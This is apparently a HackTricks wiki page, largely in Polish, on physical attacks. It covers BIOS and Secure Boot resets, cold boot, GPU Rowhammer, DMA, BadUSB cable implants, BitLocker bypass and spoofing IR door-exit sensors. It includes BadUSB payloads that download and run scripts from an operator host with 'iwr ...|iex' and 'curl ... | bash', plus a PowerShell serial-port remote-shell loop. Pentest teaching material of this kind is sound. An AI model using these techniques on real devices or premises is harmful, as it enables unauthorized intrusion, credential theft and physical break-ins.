# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## Odzyskiwanie hasła BIOS i bezpieczeństwo systemu

**Resetowanie BIOS-u** można wykonać na kilka sposobów. Większość płyt głównych zawiera **baterię**, którą po wyjęciu na około **30 minut** można zresetować ustawienia BIOS-u, w tym hasło. Alternatywnie można przestawić **jumper na płycie głównej**, aby zresetować te ustawienia poprzez połączenie określonych pinów.

W sytuacjach, gdy zmiany sprzętowe nie są możliwe lub praktyczne, rozwiązaniem są **narzędzia software**. Uruchomienie systemu z **Live CD/USB** z dystrybucjami takimi jak **Kali Linux** daje dostęp do narzędzi takich jak **_killCmos_** i **_CmosPWD_**, które mogą pomóc w odzyskaniu hasła BIOS.

W przypadkach, gdy hasło BIOS jest nieznane, wpisanie go błędnie **trzy razy** zwykle spowoduje wygenerowanie kodu błędu. Kod ten można wykorzystać na stronach takich jak [https://bios-pw.org](https://bios-pw.org), aby potencjalnie odzyskać działające hasło.

### Bezpieczeństwo UEFI

W nowoczesnych systemach korzystających z **UEFI** zamiast tradycyjnego BIOS-u, narzędzie **chipsec** może zostać użyte do analizy i modyfikacji ustawień UEFI, w tym do wyłączenia **Secure Boot**. Można to wykonać za pomocą następującej komendy:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Analiza RAM i ataki Cold Boot

RAM przechowuje dane krótko po odcięciu zasilania, zwykle przez **1 do 2 minut**. Ten czas można wydłużyć do **10 minut** poprzez zastosowanie zimnych substancji, takich jak ciekły azot. W tym wydłużonym okresie można utworzyć **memory dump** za pomocą narzędzi takich jak **dd.exe** i **volatility** do analizy.

---

## GPU Rowhammer Against Page Tables

Nowoczesne ataki GPU Rowhammer stają się znacznie bardziej użyteczne, gdy celem są **GPU virtual-memory metadata** zamiast zwykłych buforów. Najnowsze badania nad **GDDR6 NVIDIA Ampere GPUs** pokazują, że atakujący uruchamiający nieuprzywilejowany kod CUDA może budować specyficzne dla GPU wzorce hammering, używać **memory massaging** do umieszczania struktur stronicowania w podatnych wierszach, a następnie przełączać bity w **last-level page table** albo pośrednim **page directory**. Gdy tylko jeden wpis translacji zostanie uszkodzony, atakujący może uruchomić **arbitrary GPU memory read/write** i następnie przejść do kompromitacji hosta.

### Wzorzec wykorzystania

1. **Profiluj rows podatne na hammering** w GDDR6 i buduj wzorce hammering uwzględniające odświeżanie / niejednorodne, które omijają mitigations in-DRAM.
2. **Massage GPU allocations** tak, aby sterownik umieszczał struktury translacji stron w podatnych fizycznych lokalizacjach zamiast trzymać je w domyślnym chronionym pool. W praktyce może to oznaczać wyczerpanie niskopamięciowego regionu page-table i rozpylenie dużych, sparsowanych mapowań UVM z kontrolowanymi stride’ami.
3. **Flip translation metadata** takich jak **PFN** lub bity związane z aperture wewnątrz wpisu page-table / page-directory, tak aby kontrolowana przez atakującego strona wirtualna była mapowana na strony page-table, dowolną pamięć GPU albo mapowania systemowe widoczne dla hosta.
4. Ponownie użyj sfałszowanego mapowania do nadpisania kolejnych wpisów translacji i eskaluj do **arbitrary GPU memory read/write** pomiędzy contextami GPU.

### Pivot na hosta i mitigations

- Przy **IOMMU disabled** sfałszowane mapowania system aperture mogą ujawnić dowolną **host physical memory** GPU, zamieniając primitive GPU w pełną kompromitację hosta.
- **GDDRHammer** celuje w wpisy last-level page-table, podczas gdy **GeForge** pokazuje, że uszkodzenie poziomu page-directory może być łatwiejsze, ponieważ jeden bit flip może przekierować większe poddrzewo translacji. Nie traktuj tylko jednej warstwy stronicowania jako krytycznej dla bezpieczeństwa.
- **IOMMU** nadal ma znaczenie, ponieważ blokuje bezpośrednią ścieżkę do arbitralnej pamięci hosta używaną przez GDDRHammer/GeForge, ale **nie jest pełną mitigacją**. **GPUBreach** pokazuje drugi etap pivota, w którym atakujący uszkadza zapisywalne przez GPU, należące do drivera bufory CPU, a następnie wyzwala błędy bezpieczeństwa pamięci sterownika NVIDIA, aby uzyskać primitive zapisu do jądra i **root shell** nawet przy włączonym IOMMU.
- **System-level ECC** to praktyczny krok hardening na wspieranych GPU klasy workstation/server. Konsumenckie GPU bez ECC mają słabszą powierzchnię obrony.
- Te ataki nie są wyłącznie teoretyczne: **GeForge** zgłosił **1,171** bit flips na RTX 3060 i **202** na RTX A6000, co wystarczyło do zbudowania działającego łańcucha eskalacji uprawnień na hoście.

---

## Ataki Direct Memory Access (DMA)

**INCEPTION** to narzędzie zaprojektowane do **physical memory manipulation** przez DMA, kompatybilne z interfejsami takimi jak **FireWire** i **Thunderbolt**. Umożliwia omijanie procedur logowania poprzez patching pamięci tak, aby zaakceptować dowolne hasło. Jednak jest nieskuteczne wobec systemów **Windows 10**.

---

## Live CD/USB do uzyskania dostępu do systemu

Zastąpienie binariów systemowych, takich jak **_sethc.exe_** lub **_Utilman.exe_**, kopią **_cmd.exe_** może zapewnić command prompt z uprawnieniami systemowymi. Narzędzia takie jak **chntpw** mogą być użyte do edycji pliku **SAM** instalacji Windows, co pozwala na zmianę haseł.

**Kon-Boot** to narzędzie, które ułatwia logowanie do systemów Windows bez znajomości hasła poprzez tymczasowe modyfikowanie Windows kernel lub UEFI. Więcej informacji można znaleźć na [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Obsługa funkcji bezpieczeństwa Windows

### Skróty Boot i Recovery

- **Supr**: Wejście do ustawień BIOS.
- **F8**: Wejście w tryb Recovery.
- Naciśnięcie **Shift** po banerze Windows może ominąć autologon.

### Urządzenia BAD USB

Urządzenia takie jak **Rubber Ducky** i **Teensyduino** służą jako platformy do tworzenia urządzeń **bad USB**, zdolnych do wykonywania zdefiniowanych wcześniej payloads po podłączeniu do docelowego komputera.

### Volume Shadow Copy

Uprawnienia administratora pozwalają na tworzenie kopii wrażliwych plików, w tym pliku **SAM**, za pomocą PowerShell.

## Techniki BadUSB / HID Implant

### Implanty Wi-Fi zarządzane kablem

- Implanty oparte na ESP32-S3, takie jak **Evil Crow Cable Wind**, ukrywają się wewnątrz kabli USB-A→USB-C lub USB-C↔USB-C, enumerują wyłącznie jako USB keyboard i udostępniają swój stack C2 przez Wi-Fi. Operator musi jedynie zasilić kabel z hosta ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` z hasłem `123456789` i wejść na [http://cable-wind.local/](http://cable-wind.local/) (lub jego adres DHCP), aby uzyskać dostęp do wbudowanego interfejsu HTTP.
- Interfejs browser UI udostępnia zakładki *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Zapisane payloads są oznaczane per OS, układy klawiatury są przełączane dynamicznie, a ciągi VID/PID można zmieniać, aby naśladować znane peryferia.
- Ponieważ C2 działa wewnątrz kabla, telefon może przygotowywać payloads, wyzwalać wykonanie i zarządzać poświadczeniami Wi-Fi bez dotykania host OS — idealne przy krótkim czasie przebywania podczas fizycznych intruzji.

### Payloads AutoExec świadome OS

- Reguły AutoExec wiążą jeden lub więcej payloads, które uruchamiają się natychmiast po enumeracji USB. Implant wykonuje lekkie fingerprinting OS i wybiera pasujący skrypt.
- Przykładowy workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) lub `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Ponieważ wykonanie odbywa się bez nadzoru, samo podmienie kabla do ładowania może zapewnić początkowy dostęp typu „plug-and-pwn” w kontekście zalogowanego użytkownika.

### Remote shell oparty na HID, bootstrapowany przez Wi-Fi TCP

1. **Keystroke bootstrap:** Zapisany payload otwiera konsolę i wkleja pętlę, która wykonuje wszystko, co pojawi się na nowym USB serial device. Minimalna wersja dla Windows to:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant utrzymuje kanał USB CDC otwarty, podczas gdy jego ESP32-S3 uruchamia klienta TCP (skrypt Python, APK Androida lub desktopowy executable) z powrotem do operatora. Każdy bajt wpisany w sesji TCP jest przekazywany do pętli szeregowej powyżej, co daje zdalne execution komend nawet na hostach air-gapped. Output jest ograniczone, więc operatorzy zwykle uruchamiają blind commands (tworzenie konta, staging dodatkowego tooling, itp.).

### HTTP OTA update surface

- Ten sam web stack zwykle exposes nieuwierzytelnione firmware updates. Evil Crow Cable Wind nasłuchuje na `/update` i flashuje dowolny binary, który zostanie uploadowany:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## Obejście szyfrowania BitLocker

Szyfrowanie BitLocker można potencjalnie obejść, jeśli **recovery password** zostanie znalezione w pliku zrzutu pamięci (**MEMORY.DMP**). Do tego celu można użyć narzędzi takich jak **Elcomsoft Forensic Disk Decryptor** lub **Passware Kit Forensic**.

---

## Social Engineering do dodania recovery key

Nowy klucz odzyskiwania BitLocker można dodać za pomocą technik social engineering, nakłaniając użytkownika do wykonania polecenia, które dodaje nowy recovery key składający się z zer, co upraszcza proces deszyfrowania.

---

## Wykorzystanie chassis intrusion / maintenance switches do przywrócenia BIOS do ustawień fabrycznych

Wiele nowoczesnych laptopów i komputerów stacjonarnych w małej obudowie zawiera **chassis-intrusion switch**, który jest monitorowany przez Embedded Controller (EC) oraz firmware BIOS/UEFI. Głównym celem tego przełącznika jest wywołanie alertu, gdy urządzenie zostanie otwarte, ale producenci czasem implementują **nieudokumentowany recovery shortcut**, uruchamiany po przełączeniu go w określony wzorzec.

### Jak działa atak

1. Przełącznik jest podłączony do **GPIO interrupt** na EC.
2. Firmware działający na EC śledzi **timing i liczbę naciśnięć**.
3. Gdy rozpoznany zostanie zakodowany na sztywno wzorzec, EC wywołuje procedurę *mainboard-reset*, która **usuwa zawartość systemowego NVRAM/CMOS**.
4. Przy następnym uruchomieniu BIOS ładuje wartości domyślne – **supervisor password, Secure Boot keys i cała niestandardowa konfiguracja są czyszczone**.

> Gdy Secure Boot zostanie wyłączony, a firmware password zniknie, atakujący może po prostu uruchomić dowolny zewnętrzny obraz OS i uzyskać nieograniczony dostęp do wewnętrznych dysków.

### Rzeczywisty przykład – laptop Framework 13

Recovery shortcut dla Framework 13 (11th/12th/13th-gen) to:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Po dziesiątym cyklu EC ustawia flagę, która instruuje BIOS, aby wyczyścił NVRAM przy następnym reboot. Cała procedura zajmuje ~40 s i wymaga **niczego poza śrubokrętem**.

### Generic Exploitation Procedure

1. Włącz zasilanie lub wykonaj suspend-resume na celu, aby EC działał.
2. Zdejmij dolną pokrywę, aby odsłonić intrusion/maintenance switch.
3. Odtwórz wzorzec przełączania specyficzny dla vendor (sprawdź dokumentację, fora albo zreverse-engineeruj firmware EC).
4. Złóż urządzenie i zrób reboot – protections firmware powinny być wyłączone.
5. Uruchom live USB (np. Kali Linux) i wykonaj zwykły post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, itd.).

### Detection & Mitigation

* Loguj zdarzenia chassis-intrusion w OS management console i koreluj je z nieoczekiwanymi BIOS resetami.
* Stosuj **tamper-evident seals** na śrubach/pokrywach, aby wykrywać otwarcie.
* Trzymaj urządzenia w **physically controlled areas**; zakładaj, że physical access oznacza pełne compromise.
* Tam, gdzie to możliwe, wyłącz funkcję vendor “maintenance switch reset” albo wymagaj dodatkowej cryptographic authorisation dla NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
- A plastic shroud blocks the emitter and receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection and drives a relay that opens the door strike.
- Once the controller believes a target is present it often changes the outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.

### Attack Workflow
1. **Capture the emission profile** – clip a logic analyser across the controller pins to record both the pre-detection and post-detection waveforms that drive the internal IR LED.
2. **Replay only the “post-detection” waveform** – remove/ignore the stock emitter and drive an external IR LED with the already-triggered pattern from the outset. Because the receiver only cares about pulse count/frequency, it treats the spoofed carrier as a genuine reflection and asserts the relay line.
3. **Gate the transmission** – transmit the carrier in tuned bursts (e.g., tens of milliseconds on, similar off) to deliver the minimum pulse count without saturating the receiver’s AGC or interference handling logic. Continuous emission quickly desensitises the sensor and stops the relay from firing.

### Long-Range Reflective Injection
- Replacing the bench LED with a high-power IR diode, MOSFET driver, and focusing optics enables reliable triggering from ~6 m away.
- The attacker does not need line-of-sight to the receiver aperture; aiming the beam at interior walls, shelving, or door frames that are visible through glass lets reflected energy enter the ~30° field of view and mimics a close-range hand wave.
- Because the receivers expect only weak reflections, a much stronger external beam can bounce off multiple surfaces and still remain above the detection threshold.

### Weaponised Attack Torch
- Embedding the driver inside a commercial flashlight hides the tool in plain sight. Swap the visible LED for a high-power IR LED matched to the receiver’s band, add an ATtiny412 (or similar) to generate the ≈30 kHz bursts, and use a MOSFET to sink the LED current.
- A telescopic zoom lens tightens the beam for range/precision, while a vibration motor under MCU control gives haptic confirmation that modulation is active without emitting visible light.
- Cycling through several stored modulation patterns (slightly different carrier frequencies and envelopes) increases compatibility across rebranded sensor families, letting the operator sweep reflective surfaces until the relay audibly clicks and the door releases.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
